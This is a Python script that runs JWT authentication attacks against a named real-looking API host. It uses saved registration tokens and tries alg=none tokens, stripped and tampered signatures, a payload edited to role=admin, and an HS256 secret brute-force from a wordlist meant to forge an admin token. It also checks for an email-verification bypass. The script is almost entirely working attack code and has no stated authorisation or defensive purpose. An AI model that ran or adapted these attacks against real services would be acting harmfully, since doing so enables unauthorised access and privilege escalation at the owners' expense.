#!/usr/bin/env python3
import json, base64, hmac, hashlib, subprocess, urllib.request, urllib.error, os

A = "https://api.breezy.philippeluu.fr"
OUT = "/tmp/riveta"

def req(method, path, token=None, body=None, headers=None):
    url = A + path
    h = headers.copy() if headers else {}
    if token: h["Authorization"] = "Bearer " + token
    data = None
    if body is not None:
        data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=12)
        return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return -1, str(e)

def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def b64url_dec(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

# load reg tokens
def tok(f):
    with open(os.path.join(OUT,f)) as fh:
        return json.load(fh)["data"]["token"]

TB = tok("regB.json")
TC = tok("regC.json")
hdr_b, pay_b, sig_b = TB.split(".")
payload = json.loads(b64url_dec(pay_b))
print("== B registration-token payload:", payload)

print("\n== Q: does the registration token authorize /users/me (email-verify bypass)?")
print("  /users/me with reg token ->", req("GET","/users/me",token=TB)[0])

print("\n== attack 1: alg=none variants ->")
for alg in ("none","None","NONE"):
    h = b64url(json.dumps({"alg":alg,"typ":"JWT"}).encode())
    p = pay_b
    for sig in ("","x"):
        t = f"{h}.{p}.{sig}"
        print(f"   alg={alg} sig='{sig}' ->", req("GET","/users/me",token=t)[0])

print("\n== attack 2: signature stripped / tampered (same header) ->")
print("   empty sig ->", req("GET","/users/me",token=f"{hdr_b}.{pay_b}.")[0])
print("   garbage sig ->", req("GET","/users/me",token=f"{hdr_b}.{pay_b}.AAAA")[0])
# tamper role to admin, keep original signature
admin_pay = b64url(json.dumps({**payload,"role":"admin"}).encode())
print("   role=admin + original sig ->", req("GET","/users/me",token=f"{hdr_b}.{admin_pay}.{sig_b}")[0])

print("\n== attack 3: HS256 weak-secret forge (admin) ->")
secrets = ["secret","secret123","changeme","jwt_secret","jwtsecret","supersecret",
           "password","123456","breezy","breezy_secret","your-256-bit-secret",
           "my_secret","access_secret","JWT_SECRET","test","dev","secretkey",
           "mysecretkey","s3cr3t","breezy-api","api-gateway","gateway"]
hdr256 = b64url(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
forged_pay = b64url(json.dumps({**payload,"role":"admin"}).encode())
found=False
for s in secrets:
    sig = b64url(hmac.new(s.encode(), f"{hdr256}.{forged_pay}".encode(), hashlib.sha256).digest())
    code = req("GET","/users/me",token=f"{hdr256}.{forged_pay}.{sig}")[0]
    if code==200:
        print(f"   !!! WEAK SECRET = '{s}' -> 200 (forged admin token accepted)"); found=True; break
if not found:
    print(f"   no weak secret in {len(secrets)}-word list (all rejected)")
